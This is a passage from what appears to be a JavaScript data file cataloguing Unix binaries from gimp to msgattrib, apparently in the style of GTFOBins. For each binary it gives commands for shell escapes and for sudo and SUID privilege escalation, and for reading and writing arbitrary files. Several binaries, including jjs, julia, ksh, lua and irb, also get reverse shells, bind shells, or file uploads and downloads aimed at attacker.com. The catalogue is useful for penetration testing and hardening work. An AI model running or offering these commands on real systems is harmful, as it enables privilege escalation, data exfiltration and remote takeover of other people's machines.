            "file-upload": ["export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'"],
            "file-download": ["export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"],
            "file-write": ["gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'"],
            "file-read": ["gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"],
            "library-load": ["gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"],
            "suid": ["sudo install -m =xs $(which gimp) .\n\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
            "sudo": ["sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ginsh ============ */
    {
        name: "ginsh",
        functions: {
            "shell": ["ginsh\n!/bin/sh"],
            "sudo": ["sudo ginsh\n!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which ginsh) .\n\n./ginsh\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ git ============ */
    {
        name: "git",
        functions: {
            "shell": ["PAGER='sh -c \"exec sh 0<&1\"' git -p help"],
            "file-write": ["git apply --unsafe-paths --directory / x.patch"],
            "file-read": ["LFILE=file_to_read\ngit diff /dev/null $LFILE"],
            "sudo": ["sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"],
            "limited-suid": ["sudo install -m =xs $(which git) .\n\nPAGER='sh -c \"exec sh 0<&1\"' ./git -p help"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ grc ============ */
    {
        name: "grc",
        functions: {
            "shell": ["grc --pty /bin/sh"],
            "sudo": ["sudo grc --pty /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ grep ============ */
    {
        name: "grep",
        functions: {
            "file-read": ["LFILE=file_to_read\ngrep '' $LFILE"],
            "suid": ["sudo install -m =xs $(which grep) .\n\nLFILE=file_to_read\n./grep '' $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo grep '' $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ gtester ============ */
    {
        name: "gtester",
        functions: {
            "shell": ["TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF"],
            "file-write": ["LFILE=file_to_write\ngtester \"DATA\" -o $LFILE"],
            "suid": ["sudo install -m =xs $(which gtester) .\n\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"],
            "sudo": ["TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ gzip ============ */
    {
        name: "gzip",
        functions: {
            "file-read": ["LFILE=file_to_read\ngzip -f $LFILE -t"],
            "suid": ["sudo install -m =xs $(which gzip) .\n\nLFILE=file_to_read\n./gzip -f $LFILE -t"],
            "sudo": ["LFILE=file_to_read\nsudo gzip -f $LFILE -t"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ hd ============ */
    {
        name: "hd",
        functions: {
            "file-read": ["LFILE=file_to_read\nhd \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which hd) .\n\nLFILE=file_to_read\n./hd \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo hd \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ head ============ */
    {
        name: "head",
        functions: {
            "file-read": ["LFILE=file_to_read\nhead -c1G \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which head) .\n\nLFILE=file_to_read\n./head -c1G \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo head -c1G \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ hexdump ============ */
    {
        name: "hexdump",
        functions: {
            "file-read": ["LFILE=file_to_read\nhexdump -C \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which hexdump) .\n\nLFILE=file_to_read\n./hexdump -C \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo hexdump -C \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ highlight ============ */
    {
        name: "highlight",
        functions: {
            "file-read": ["LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which highlight) .\n\nLFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ hping3 ============ */
    {
        name: "hping3",
        functions: {
            "shell": ["hping3\n/bin/sh"],
            "suid": ["sudo install -m =xs $(which hping3) .\n\n./hping3\n/bin/sh -p"],
            "sudo": ["sudo hping3\n/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ iconv ============ */
    {
        name: "iconv",
        functions: {
            "file-write": ["LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\""],
            "file-read": ["LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which iconv) .\n\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo iconv -f 8859_1 -t 8859_1 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ iftop ============ */
    {
        name: "iftop",
        functions: {
            "shell": ["iftop\n!/bin/sh"],
            "sudo": ["sudo iftop\n!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which iftop) .\n\n./iftop\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ install ============ */
    {
        name: "install",
        functions: {
            "suid": ["sudo install -m =xs $(which install) .\n\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF"],
            "sudo": ["LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ ionice ============ */
    {
        name: "ionice",
        functions: {
            "shell": ["ionice /bin/sh"],
            "suid": ["sudo install -m =xs $(which ionice) .\n\n./ionice /bin/sh -p"],
            "sudo": ["sudo ionice /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ip ============ */
    {
        name: "ip",
        functions: {
            "file-read": ["LFILE=file_to_read\nip -force -batch \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which ip) .\n\nLFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n\n./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo"],
            "sudo": ["LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n\nsudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ irb ============ */
    {
        name: "irb",
        functions: {
            "shell": ["irb\nexec '/bin/bash'"],
            "reverse-shell": ["export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end"],
            "file-upload": ["irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"],
            "file-download": ["export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])"],
            "file-write": ["irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }"],
            "file-read": ["irb\nputs File.read(\"file_to_read\")"],
            "library-load": ["irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")"],
            "sudo": ["sudo irb\nexec '/bin/bash'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ispell ============ */
    {
        name: "ispell",
        functions: {
            "shell": ["ispell /etc/passwd\n!/bin/sh"],
            "suid": ["sudo install -m =xs $(which ispell) .\n\n./ispell /etc/passwd\n!/bin/sh -p"],
            "sudo": ["sudo ispell /etc/passwd\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ jjs ============ */
    {
        name: "jjs",
        functions: {
            "shell": ["echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"],
            "file-download": ["export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs"],
            "file-write": ["echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs"],
            "file-read": ["echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs"],
            "suid": ["sudo install -m =xs $(which jjs) .\n\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"],
            "sudo": ["echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ joe ============ */
    {
        name: "joe",
        functions: {
            "shell": ["joe\n^K!/bin/sh"],
            "sudo": ["sudo joe\n^K!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which joe) .\n\n./joe\n^K!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ join ============ */
    {
        name: "join",
        functions: {
            "file-read": ["LFILE=file_to_read\njoin -a 2 /dev/null $LFILE"],
            "suid": ["sudo install -m =xs $(which join) .\n\nLFILE=file_to_read\n./join -a 2 /dev/null $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ journalctl ============ */
    {
        name: "journalctl",
        functions: {
            "shell": ["journalctl\n!/bin/sh"],
            "sudo": ["sudo journalctl\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ jq ============ */
    {
        name: "jq",
        functions: {
            "file-read": ["LFILE=file_to_read\njq -Rr . \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which jq) .\n\nLFILE=file_to_read\n./jq -Rr . \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ jrunscript ============ */
    {
        name: "jrunscript",
        functions: {
            "shell": ["jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"],
            "file-download": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\""],
            "file-write": ["jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"],
            "file-read": ["jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"],
            "suid": ["sudo install -m =xs $(which jrunscript) .\n\n./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""],
            "sudo": ["sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ jtag ============ */
    {
        name: "jtag",
        functions: {
            "shell": ["jtag --interactive\nshell /bin/sh"],
            "sudo": ["sudo jtag --interactive\nshell /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ julia ============ */
    {
        name: "julia",
        functions: {
            "shell": ["julia -e 'run(`/bin/sh`)'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\njulia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"],
            "file-download": ["export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'"],
            "file-write": ["export LFILE=file_to_write\njulia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'"],
            "file-read": ["export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'"],
            "suid": ["sudo install -m =xs $(which julia) .\n\n./julia -e 'run(`/bin/sh -p`)'"],
            "sudo": ["sudo julia -e 'run(`/bin/sh`)'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ knife ============ */
    {
        name: "knife",
        functions: {
            "shell": ["knife exec -E 'exec \"/bin/sh\"'"],
            "sudo": ["sudo knife exec -E 'exec \"/bin/sh\"'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ksh ============ */
    {
        name: "ksh",
        functions: {
            "shell": ["ksh"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"],
            "file-upload": ["export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"],
            "file-download": ["export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"],
            "file-write": ["export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'"],
            "file-read": ["export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'"],
            "suid": ["sudo install -m =xs $(which ksh) .\n\n./ksh -p"],
            "sudo": ["sudo ksh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ksshell ============ */
    {
        name: "ksshell",
        functions: {
            "file-read": ["LFILE=file_to_read\nksshell -i $LFILE"],
            "suid": ["sudo install -m =xs $(which ksshell) .\n\nLFILE=file_to_read\n./ksshell -i $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo ksshell -i $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ksu ============ */
    {
        name: "ksu",
        functions: {
            "sudo": ["sudo ksu -q -e /bin/sh"]
        },
        contexts: ["sudo"]
    },

    /* ============ kubectl ============ */
    {
        name: "kubectl",
        functions: {
            "file-upload": ["LFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"],
            "suid": ["sudo install -m =xs $(which kubectl) .\n\nLFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"],
            "sudo": ["LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ latex ============ */
    {
        name: "latex",
        functions: {
            "shell": ["latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"],
            "file-read": ["latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi"],
            "sudo": ["sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"],
            "limited-suid": ["sudo install -m =xs $(which latex) .\n\n./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ latexmk ============ */
    {
        name: "latexmk",
        functions: {
            "shell": ["latexmk -e 'exec \"/bin/sh\";'\n\nlatexmk -latex='/bin/sh #' /dev/null"],
            "file-read": ["latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'"],
            "sudo": ["sudo latexmk -e 'exec \"/bin/sh\";'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ld.so ============ */
    {
        name: "ld.so",
        functions: {
            "shell": ["/lib/ld.so /bin/sh"],
            "suid": ["sudo install -m =xs $(which ld.so) .\n\n./ld.so /bin/sh -p"],
            "sudo": ["sudo /lib/ld.so /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ldconfig ============ */
    {
        name: "ldconfig",
        functions: {
            "sudo": ["TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\nsudo ldconfig -f \"$TF/conf\""],
            "limited-suid": ["sudo install -m =xs $(which ldconfig) .\n\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n./ldconfig -f \"$TF/conf\""]
        },
        contexts: ["sudo", "limited-suid"]
    },

    /* ============ less ============ */
    {
        name: "less",
        functions: {
            "shell": ["less /etc/profile\n!/bin/sh"],
            "file-write": ["echo DATA | less\nsfile_to_write\nq"],
            "file-read": ["less file_to_read"],
            "suid": ["sudo install -m =xs $(which less) .\n\n./less file_to_read"],
            "sudo": ["sudo less /etc/profile\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ lftp ============ */
    {
        name: "lftp",
        functions: {
            "shell": ["lftp -c '!/bin/sh'"],
            "sudo": ["sudo lftp -c '!/bin/sh'"],
            "limited-suid": ["sudo install -m =xs $(which lftp) .\n\n./lftp -c '!/bin/sh'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ links ============ */
    {
        name: "links",
        functions: {
            "file-read": ["LFILE=file_to_read\nlinks \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which links) .\n\nLFILE=file_to_read\n./links \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo links \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ln ============ */
    {
        name: "ln",
        functions: {
            "sudo": ["sudo ln -fs /bin/sh /bin/ln\nsudo ln"]
        },
        contexts: ["sudo"]
    },

    /* ============ loginctl ============ */
    {
        name: "loginctl",
        functions: {
            "shell": ["loginctl user-status\n!/bin/sh"],
            "sudo": ["sudo loginctl user-status\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ logsave ============ */
    {
        name: "logsave",
        functions: {
            "shell": ["logsave /dev/null /bin/sh -i"],
            "suid": ["sudo install -m =xs $(which logsave) .\n\n./logsave /dev/null /bin/sh -i -p"],
            "sudo": ["sudo logsave /dev/null /bin/sh -i"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ look ============ */
    {
        name: "look",
        functions: {
            "file-read": ["LFILE=file_to_read\nlook '' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which look) .\n\nLFILE=file_to_read\n./look '' \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo look '' \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ lp ============ */
    {
        name: "lp",
        functions: {
            "file-upload": ["LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ ltrace ============ */
    {
        name: "ltrace",
        functions: {
            "shell": ["ltrace -b -L /bin/sh"],
            "file-write": ["LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA"],
            "file-read": ["LFILE=file_to_read\nltrace -F $LFILE /dev/null"],
            "sudo": ["sudo ltrace -b -L /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ lua ============ */
    {
        name: "lua",
        functions: {
            "shell": ["lua -e 'os.execute(\"/bin/sh\")'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"],
            "bind-shell": ["export LPORT=12345\nlua -e 'local k=require(\"socket\"); local s=assert(k.bind(\"*\",os.getenv(\"LPORT\"))); local c=s:accept(); while true do local r,x=c:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));c:send(b); end;c:close();f:close();'"],
            "file-write": ["lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"],
            "file-read": ["lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"],
            "suid": ["sudo install -m =xs $(which lua) .\n\nlua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"],
            "sudo": ["sudo lua -e 'os.execute(\"/bin/sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which lua) .\n\n./lua -e 'os.execute(\"/bin/sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ lualatex ============ */
    {
        name: "lualatex",
        functions: {
            "shell": ["lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"],
            "sudo": ["sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"],
            "limited-suid": ["sudo install -m =xs $(which lualatex) .\n\n./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ luatex ============ */
    {
        name: "luatex",
        functions: {
            "shell": ["luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"],
            "sudo": ["sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"],
            "limited-suid": ["sudo install -m =xs $(which luatex) .\n\n./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ lwp-download ============ */
    {
        name: "lwp-download",
        functions: {
            "file-download": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE"],
            "file-write": ["LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE"],
            "file-read": ["LFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF"],
            "sudo": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ lwp-request ============ */
    {
        name: "lwp-request",
        functions: {
            "file-read": ["LFILE=file_to_read\nlwp-request \"file://$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ mail ============ */
    {
        name: "mail",
        functions: {
            "shell": ["mail --exec='!/bin/sh'"],
            "sudo": ["sudo mail --exec='!/bin/sh'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ make ============ */
    {
        name: "make",
        functions: {
            "shell": ["COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\""],
            "file-write": ["LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" ."],
            "suid": ["sudo install -m =xs $(which make) .\n\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""],
            "sudo": ["COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ man ============ */
    {
        name: "man",
        functions: {
            "shell": ["man man\n!/bin/sh"],
            "file-read": ["man file_to_read"],
            "sudo": ["sudo man man\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ mawk ============ */
    {
        name: "mawk",
        functions: {
            "shell": ["mawk 'BEGIN {system(\"/bin/sh\")}'"],
            "file-write": ["LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"],
            "file-read": ["LFILE=file_to_read\nmawk '//' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which mawk) .\n\nLFILE=file_to_read\n./mawk '//' \"$LFILE\""],
            "sudo": ["sudo mawk 'BEGIN {system(\"/bin/sh\")}'"],
            "limited-suid": ["sudo install -m =xs $(which mawk) .\n\n./mawk 'BEGIN {system(\"/bin/sh\")}'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ minicom ============ */
    {
        name: "minicom",
        functions: {
            "shell": ["minicom -D /dev/null"],
            "suid": ["sudo install -m =xs $(which minicom) .\n\n./minicom -D /dev/null"],
            "sudo": ["sudo minicom -D /dev/null"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ more ============ */
    {
        name: "more",
        functions: {
            "shell": ["TERM= more /etc/profile\n!/bin/sh"],
            "file-read": ["more file_to_read"],
            "suid": ["sudo install -m =xs $(which more) .\n\n./more file_to_read"],
            "sudo": ["TERM= sudo more /etc/profile\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ mosquitto ============ */
    {
        name: "mosquitto",
        functions: {
            "file-read": ["mosquitto -c /path/to/input-file"],
            "suid": ["mosquitto -c /path/to/input-file"],
            "sudo": ["mosquitto -c /path/to/input-file"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ mount ============ */
    {
        name: "mount",
        functions: {
            "sudo": ["sudo mount -o bind /bin/sh /bin/mount\nsudo mount"]
        },
        contexts: ["sudo"]
    },

    /* ============ msfconsole ============ */
    {
        name: "msfconsole",
        functions: {
            "shell": ["sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")"],
            "sudo": ["sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ msgattrib ============ */
    {
        name: "msgattrib",
        functions: {
            "file-read": ["LFILE=file_to_read\nmsgattrib -P $LFILE"],
